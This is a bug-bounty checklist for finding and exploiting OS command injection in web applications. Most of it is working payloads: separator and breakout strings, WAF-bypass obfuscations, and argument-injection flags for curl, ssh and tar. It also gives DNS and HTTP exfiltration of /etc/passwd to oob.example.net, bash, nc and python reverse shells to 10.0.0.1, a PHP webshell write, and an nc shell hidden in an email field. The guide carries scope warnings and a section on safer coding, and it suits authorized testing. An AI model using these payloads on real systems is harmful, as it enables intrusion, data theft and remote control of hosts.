# OS Command Injection — Bug Bounty Hunting Checklist

> **Severity mindset:** Detection-only (blind time delay / DNS-OOB) → Medium. Command output returned in response → High. Unauthenticated RCE, root execution, or pivot to cloud metadata / internal network → Critical. Always push the chain toward demonstrable RCE — but prove it non-destructively.

> **Scope reminder:** Only test targets you're authorized for. Many programs restrict which commands you may run (no file browsing, no destructive ops, no lateral movement). Prove impact with `whoami` / `id` / `sleep` / DNS-OOB — never `rm`, `kill`, fork bombs, or reading other users' data. One safe `id` output is a valid critical; a wiped server is a banned researcher.

---

## Concept Distinctions

| Type | What It Does | Severity |
| --- | --- | --- |
| **In-band / Direct** | Command output is reflected straight into the HTTP response | High |
| **Blind (no output)** | Command runs but output is never returned — confirm by side-effect | Medium–High |
| **Time-based** | Force a measurable delay (`sleep`) to confirm blind execution | Medium |
| **Output redirection** | Redirect output to a web-accessible file, then fetch it | High |
| **Out-of-band (OAST)** | Force the server to make a DNS/HTTP callback you control | High |
| **Second-order / Stored** | Payload stored now, executed later by a backend job/feature | High–Critical |
| **Argument / Flag injection** | Metacharacters filtered, but you smuggle `-`/`--` flags into a downstream binary | Medium–Critical |

---

## Phase 1 — Recon & Discovery

### 1.1 Google Dorks (passive, zero interaction)
```
site:target.com inurl:cmd=
site:target.com inurl:exec=
site:target.com inurl:ping=
site:target.com inurl:query=
site:target.com inurl:host=
site:target.com inurl:ip=
site:target.com inurl:url=
site:target.com inurl:download=
site:target.com inurl:run=
site:target.com ext:cgi
site:target.com ext:pl inurl:=
inurl:"ping?" site:target.com
inurl:"/cgi-bin/" site:target.com
```

### 1.2 Historical URL Harvesting → CMDi-prone params
```bash
# Collect all historical URLs
echo "target.com" | gau > urls.txt
echo "target.com" | waybackurls >> urls.txt
echo "target.com" | katana -silent >> urls.txt
cat urls.txt | uro | sort -u > urls_clean.txt

# Keep only URLs whose params match the CMDi master list
grep -aiE '(\?|&)(cmd|exec|command|execute|ping|query|jump|code|reg|do|func|arg|option|load|process|step|read|function|req|feature|exe|module|payload|run|print|download|path|folder|file|host|proxy|server|destination|address|ip|hostname|port|url|uri)=' \
  urls_clean.txt | sort -u > cmdi_candidates.txt
```

### 1.3 High-Value Endpoint Patterns — Check These Manually
CMDi lives wherever the app shells out to a system binary. Hunt these:
- [ ] **Network/diagnostic tools** — `ping`, `traceroute`, `nslookup`, `dig`, `whois`, `curl`, `wget`, port-check, "test connection"
- [ ] **Media/document converters** — ImageMagick, `ffmpeg`, Ghostscript, `wkhtmltopdf`, LibreOffice, thumbnailers, EXIF/metadata processors
- [ ] **File processors** — antivirus scan, archive extract (`unzip`/`tar`), `pdftotext`, OCR, CSV/XLS import
- [ ] **Backup / export / report** — `mysqldump`, DB backup plugins, scheduled report generators (see CVE-2019-25224, WP DB Backup, 70k+ sites)
- [ ] **SCM / CI / webhooks** — git clone of attacker URL, webhook URL fetch, build triggers
- [ ] **Admin diagnostic consoles** — "run command", log tail, system info pages
- [ ] **CGI routers / IoT dispatchers** — single endpoint dispatching to many backend utilities (`topicurl=<handler>&param=...`)
- [ ] **Non-GET vectors** — JSON/XML bodies, `User-Agent`/`X-Forwarded-For`/`Referer` headers, cookies, multipart filenames

### 1.4 Parameter Discovery with ffuf
```bash
# Find which params the endpoint accepts
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'https://target.com/api/tools?FUZZ=127.0.0.1' \
  -mc all -ac

# Or fuzz with the CMDi-specific param list (see Appendix)
ffuf -w cmdi-params.txt:FUZZ \
  -u 'https://target.com/diagnostic?FUZZ=127.0.0.1' -ac
```

---

## Phase 2 — Automated Scanning (CLI-first)

### 2.1 qsreplace Time-Based Sweep
```bash
# Inject a sleep across every harvested URL, time each request
cat cmdi_candidates.txt | qsreplace ';sleep 8;' \
  | while read u; do
      t=$(curl -s -o /dev/null -w '%{time_total}' "$u")
      awk -v t="$t" -v u="$u" 'BEGIN{ if (t+0 > 7) print "[SLOW " t "] " u }'
    done

# Also try other separators
cat cmdi_candidates.txt | qsreplace '`sleep 8`' > /tmp/bt.txt
cat cmdi_candidates.txt | qsreplace '$(sleep 8)' >> /tmp/bt.txt
```

### 2.2 qsreplace OOB DNS Sweep
```bash
# Replace param values with a DNS callback (unique per host helps attribution)
cat cmdi_candidates.txt \
  | qsreplace ';nslookup $(echo cmdi).oob.example.net;' \
  | xargs -P10 -I@ curl -s -o /dev/null @
# Then watch your interactsh/Collaborator pane for DNS hits
interactsh-client -v
```

### 2.3 Nuclei DAST / Fuzzing
```bash
# Generic DAST fuzzing (covers CMDi/SQLi/SSRF)
nuclei -l cmdi_candidates.txt -dast -tags cmdi,injection -o nuclei_cmdi.txt

# Official header-based CMDi template — clone it to build custom variants
nuclei -l cmdi_candidates.txt \
  -t http/fuzzing/header-command-injection.yaml -o nuclei_header_cmdi.txt
```
> The interactsh OOB pattern in the official templates transfers directly to blind CMDi — clone `header-command-injection.yaml` and swap in your own payloads/parts/pre-conditions.

### 2.4 Commix (automated exploitation)
```bash
# GET param
commix -u 'https://target.com/diagnostic?host=127.0.0.1' -p host

# POST body
commix -u 'https://target.com/api/ping' --data='ip=127.0.0.1' -p ip

# Header / cookie injection points
commix -u 'https://target.com/' --headers='X-Forwarded-For: 127.0.0.1' --level=2

# Once confirmed: spawn a pseudo-shell
commix -u '...' --os-cmd='id'
```
> ⚠️ Manually confirm the injection first. Commix is noisy — it can trip WAFs and burn your rate-limit / get your IP banned before you've proven anything.

---

## Phase 3 — Detection & Confirmation

### 3.1 Separators & Chaining
| Separator | Behavior | Platform |
| --- | --- | --- |
| `;` | Sequential | Unix only |
| `&&` | Run 2nd if 1st succeeds | Cross-platform |
| `\|\|` | Run 2nd if 1st fails | Cross-platform |
| `&` | Background / run both | Cross-platform |
| `\|` | Pipe output | Cross-platform |
| `%0a` (newline) | New command line | Unix (often best) |
| `%0d` (CR) | Carriage return | Unix |
| `` `cmd` `` / `$(cmd)` | Inline substitution | Unix |
| `${IFS}` | Whitespace substitute | Unix |

### 3.2 Context Breakout Patterns
Your input may land inside quotes or mid-argument — break out first:
```
; cmd #
| cmd #
& cmd #
|| cmd ||
& cmd &
'; cmd #
"; cmd; "
$(cmd)
`cmd`
%0acmd%0a
```

### 3.3 Direct / In-Band Marker Test
```
& echo a1b2c3wugh &
```
Look for `a1b2c3wugh` reflected in the response → in-band execution confirmed.

### 3.4 Time-Based (blind)
```
# Linux
& sleep 10 &
; sleep 10 ;
& ping -c 10 127.0.0.1 &
$(sleep 10)
`sleep 10`
& perl -e "sleep 10" &
& python3 -c "import time;time.sleep(10)" &

# Windows
& timeout /t 10 &
& ping -n 10 127.0.0.1 &
& powershell Start-Sleep -s 10 &
```
Response delayed ≈10s → blind execution confirmed. (Run twice to rule out latency.)

### 3.5 Output Redirection (blind → readable)
```
& whoami > /var/www/static/o.txt &
& id > /var/www/html/o.txt &
& whoami > /usr/share/nginx/html/o.txt &
```
Then fetch `https://target.com/o.txt`. Useful when output isn't reflected but the webroot is writable.

### 3.6 Out-of-Band (OAST) — most reliable for blind
```
# DNS callback (works even when egress HTTP is firewalled)
& nslookup x1y2.oob.example.net &
& host x1y2.oob.example.net &
& dig x1y2.oob.example.net &

# HTTP callback
& curl http://oob.example.net/x1y2 &
& wget http://oob.example.net/x1y2 &

# Data exfil into the subdomain — tells you WHO and WHERE it runs
& nslookup `whoami`.oob.example.net &
& curl "$(uname -a | tr ' ' '-').oob.example.net" &
```
The DNS query `wwwuser.x1y2.oob.example.net` arriving at your listener confirms execution *and* leaks the running user.

### 3.7 Polyglot One-Liners (multi-context, fire-and-forget)
```
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

---

## Phase 4 — WAF / Filter Bypass

### 4.1 No-Space Bypass (space is filtered)
```
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}              # brace expansion
cat</etc/passwd                # input redirection
X=$'cat\x20/etc/passwd'&&$X    # ANSI-C quoting (\x20 = space)
ping%09-c%091%09127.0.0.1      # %09 = tab
```

### 4.2 No-Slash Bypass (`/` is filtered)
```
cat ${HOME:0:1}etc${HOME:0:1}passwd     # ${HOME:0:1} == "/"
cat ${PATH:0:1}etc${PATH:0:1}passwd
cat /???/passwd                          # wildcard for /etc
cat /e??/p?ss??                          # wildcard the whole path
echo . | tr '!-0' '"-1'                  # char translation to build "/"
```

### 4.3 Encoding (keyword blacklists)
```
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash          # base64 -> "cat /etc/passwd"
bash<<<$(xxd -r -p<<<636174202f6574632f706173737764)     # hex -> command
$(echo -e "\x63\x61\x74")  /etc/passwd                   # hex via echo -e
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
```

### 4.4 Keyword Obfuscation (command name is blacklisted)
```
w'h'o'am'i          # single-quote splitting
w"h"o"am"i          # double-quote splitting
who$()ami           # empty substitution inside the word
who$@ami            # $@ expands to nothing
wh\oami             # backslash insertion
/b\i\n/c\a\t /etc/passwd
${test//hh??hm/}    # variable-expansion stripping to assemble the word
```

### 4.5 Windows-Specific
```
@^p^o^w^e^r^shell           # caret insertion breaks naive keyword matches
powershell C:**2\n??e*d.*?  # wildcard obfuscation of cmd.exe
%PROGRAMFILES:~10,-5%        # substring extraction to build characters
WhoAmI                       # case-insensitive (Windows ignores case)
for /f %i in ('whoami') do ...
```

---

## Phase 5 — Argument / Flag Injection

> When the app blocks `; | & $ \`` but passes your value as an **argument** to a binary (`exec("ping " + ip)` with `ip` sanitized of separators), you can still inject **leading-dash flags** that change that binary's behaviour. No shell metacharacters required.

### 5.1 The Concept
Input `-flag` gets parsed as an option by the downstream tool. Test by submitting a value starting with `-` and watching for behavior change. Remember `--` ends option parsing.

### 5.2 High-Value Target Binaries
```
# curl — arbitrary file write / read attacker config / exfil
curl http://attacker/shell.php -o /var/www/html/shell.php
-K /path/to/attacker/config          # load attacker-controlled curl config
-o /tmp/x  /  -T file  /  @/etc/passwd

# ssh — run a command via ProxyCommand
ssh -oProxyCommand="touch /tmp/pwned" foo@foo

# tcpdump — execute a script after rotation
-G 1 -W 1 -z /path/script.sh

# ping — DoS / flood (often the lowest-effort proof of arg injection)
-f          (flood)
-c 100000   (long run)

# psql — pipe output to a command
psql -o '|id > /tmp/foo'

# chrome / chromium (headless render endpoints)
--gpu-launcher="id > /tmp/foo"

# JVM-backed services
-XX:OnOutOfMemoryError="cmd /c calc"  (paired with -XX:MaxMetaspaceSize=16m)

# tar / zip — checkpoint actions
tar -cf /dev/null x --checkpoint=1 --checkpoint-action=exec=sh\ script.sh
```

### 5.3 CGI Router / IoT Dispatcher Pattern
```
topicurl=setEasyMeshAgentCfg&agentName=;id;
topicurl=<handler>&param=-n        # inject a flag into the dispatched utility
```

---

## Phase 6 — Blind, OOB & Second-Order Exploitation

### 6.1 Boolean / Time Data Extraction (no output channel at all)
```bash
# Extract data one character at a time via timing
if [ $(whoami|cut -c 1) == r ]; then sleep 8; fi
if [ $(id -u) -eq 0 ]; then sleep 8; fi
```

### 6.2 DNS Exfiltration (most robust blind exfil)
```bash
# Leak directory listing
for i in $(ls /); do host "$i.oob.example.net"; done

# Leak file contents hex-chunked (DNS labels max 63 chars)
host "$(cat /etc/passwd | head -c 60 | xxd -p | tr -d '\n').oob.example.net"

# Leak whoami
nslookup "$(whoami).oob.example.net"
```

### 6.3 HTTP Exfiltration (when egress HTTP is allowed)
```bash
curl http://oob.example.net/ -X POST -d "$(cat /etc/passwd)"
curl http://oob.example.net/?d=$(id | base64 | tr -d '\n')
wget --post-file=/etc/passwd http://oob.example.net/
```

### 6.4 Second-Order / Stored Injection
Inject into a value that's stored now and shell'd-out later by a backend job:
```
# Registration email — fires on welcome mail / password reset / digest
attacker+$(whoami)@example.com
attacker+`whoami`@example.com

# No-space variant for fields that strip spaces
attacker+$({nc,-c,sh,1.2.3.4,9999})@example.com

# Username / display name / filename / device name fields
test$(curl${IFS}oob.example.net)
```
Triggers: password reset, newsletter/notification send, report/PDF generation, scheduled backup, log-processing cron. These are harder to find but high-value and often unauthenticated.

---

## Phase 7 — Escalation to RCE

> ⚠️ **Safe-PoC discipline:** confirm with `id` / `whoami` / a DNS callback and STOP. Do not spawn persistent shells, move laterally, read other users' data, or run destructive commands unless the program's policy explicitly permits it. A screenshot of `uid=...` is your bounty — anything more risks the report and your account.

### 7.1 From Confirmation → Interactive (only if scope allows)
```bash
# Reverse shells (set up your listener first: nc -lvnp 443)
bash -i >& /dev/tcp/10.0.0.1/443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("sh")'
perl -e 'use Socket;$i="10.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));...'
```
> Full reverse-shell matrix: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

### 7.2 File-Write Webshell (when there's no output channel)
```bash
& echo '<?php system($_GET["c"]); ?>' > /var/www/html/x.php &
# then: curl 'https://target.com/x.php?c=id'
```

### 7.3 Source / Code-Review Signals (dangerous sinks)
| Language | Dangerous sink | Safer alternative |
| --- | --- | --- |
| Node.js | `child_process.exec()`, `execSync()` | `execFile()` with arg array |
| PHP | `system`, `exec`, `shell_exec`, `passthru`, `proc_open`, `` `` `` | `escapeshellarg` + no shell |
| Python | `os.system`, `os.popen`, `subprocess(... shell=True)`, `eval` | `subprocess([...], shell=False)` |
| Java | `Runtime.exec(String)` | `ProcessBuilder` with arg list |
| Ruby | `system("...#{x}")`, `` `...` ``, `%x()`, `eval` | `system(cmd, arg1, arg2)` |
> `exec()`-family that takes a **string** = shell parsing = injection. Argument-array forms are safe from separators (but still watch for **argument injection**, Phase 5).

---

## Phase 8 — Response Validation

```bash
# Confirm in-band execution
curl -s 'https://target.com/diagnostic?host=;id;' | grep -E 'uid=[0-9]+'

# Confirm time-based (should print ~10s)
curl -s -o /dev/null -w 'time=%{time_total}\n' \
  'https://target.com/diagnostic?host=127.0.0.1;sleep+10;'

# Confirm output redirection
curl -s 'https://target.com/o.txt'        # should contain whoami output

# Confirm OOB — check listener
interactsh-client          # DNS/HTTP hit = blind execution proven
```

---

## Phase 9 — Reporting

### Severity Matrix
| Finding | Severity | Typical payout tier |
| --- | --- | --- |
| Blind execution proven (sleep/DNS only), low-priv | Medium | $500–$2,000 |
| Command output returned, limited privilege | High | $2,000–$10,000 |
| Full server compromise / root / unauth RCE | Critical | $10,000+ (often $25k+) |
| Unauthenticated injection | +1 severity bump | — |
| Pivot to cloud metadata / internal network / creds | +1 severity bump | — |

### Pre-Submission PoC Checklist
- [ ] Non-destructive proof only (`id` / `whoami` / DNS callback) — captured in output
- [ ] OS fingerprint (`uname -a` / `ver`) noted to scope impact
- [ ] Full vulnerable endpoint, parameter, and HTTP method documented
- [ ] Detection method stated (in-band / time / OOB) with reproducible payload
- [ ] Impact narrative: what an attacker reaches (data, infra, other users)
- [ ] Confirm you stayed within program scope — no lateral movement / data access

### Minimal PoC Template
```
Vulnerable endpoint:
GET /diagnostic?host=127.0.0.1

Payload (parameter `host`):
127.0.0.1;id;

Request:
curl -s "https://target.com/diagnostic?host=127.0.0.1;id;"

Response excerpt:
PING 127.0.0.1 ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Impact:
The `host` parameter is concatenated into a shell command without
sanitization, allowing arbitrary OS command execution as www-data.
This enables reading application secrets, pivoting to internal
services, and full host compromise. (Proven non-destructively with `id`.)
```

---

## Appendix A — CMDi Parameter Master List
```
cmd exec command execute ping query jump code reg do func arg option load
process step read function req feature exe module payload run print download
path folder file host proxy server destination address ip hostname port url uri
```

## Appendix B — Recon Command Cheat (proof of execution)
| Purpose | Linux | Windows |
| --- | --- | --- |
| Current user | `whoami` / `id` | `whoami` |
| OS / version | `uname -a` | `ver` |
| Network config | `ifconfig` / `ip a` | `ipconfig /all` |
| Connections | `netstat -an` | `netstat -an` |
| Processes | `ps -ef` | `tasklist` |
| Hostname | `hostname` | `hostname` |

## Appendix C — Tool Stack Reference
| Tool | Purpose | Install |
| --- | --- | --- |
| `commix` | Automated CMDi detection + exploitation | `git clone https://github.com/commixproject/commix` |
| `nuclei` | DAST / fuzzing templates | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| `interactsh-client` | Self-hosted OOB (DNS/HTTP) listener | `go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest` |
| `ffuf` | Parameter + payload fuzzing | `go install github.com/ffuf/ffuf/v2@latest` |
| `qsreplace` | Bulk payload injection into query strings | `go install github.com/tomnomnom/qsreplace@latest` |
| `gau` | Historical URL harvesting | `go install github.com/lc/gau/v2/cmd/gau@latest` |
| `waybackurls` | Wayback URL harvesting | `go install github.com/tomnomnom/waybackurls@latest` |
| `katana` | Active crawler | `go install github.com/projectdiscovery/katana/cmd/katana@latest` |
| `uro` | De-duplicate / normalize URLs | `pipx install uro` |
| `gf` | Pattern filter (CMDi/RCE) | `go install github.com/tomnomnom/gf@latest` |

## Appendix D — Key Wordlists (SecLists / PayloadsAllTheThings)
```
PayloadsAllTheThings/Command Injection/Intruder/command_exec.txt
PayloadsAllTheThings/Command Injection/Intruder/command-execution-unix.txt
SecLists/Discovery/Web-Content/burp-parameter-names.txt
SecLists/Fuzzing/command-injection-commix.txt
```

---

## References
- PortSwigger OS Command Injection: https://portswigger.net/web-security/os-command-injection
- PayloadsAllTheThings (separators, bypass, arg injection, exfil): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
- HackTricks command injection: https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/command-injection.md
- OWASP WSTG — Testing for Command Injection: https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
- YesWeHack ultimate guide (bug-bounty methodology, second-order, Commix): https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-os-command-injection
- Nuclei header CMDi DAST template: https://github.com/projectdiscovery/nuclei-templates/blob/main/http/fuzzing/header-command-injection.yaml
- Reverse-shell cheatsheet: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
- PortSwigger CMDi labs (verify payloads): simple / blind time-delay / output-redirection / blind-OOB
- Full article reference library: [[1-Refreces/ARTICLES/ATTACK/COMMAND-INJECTION]]
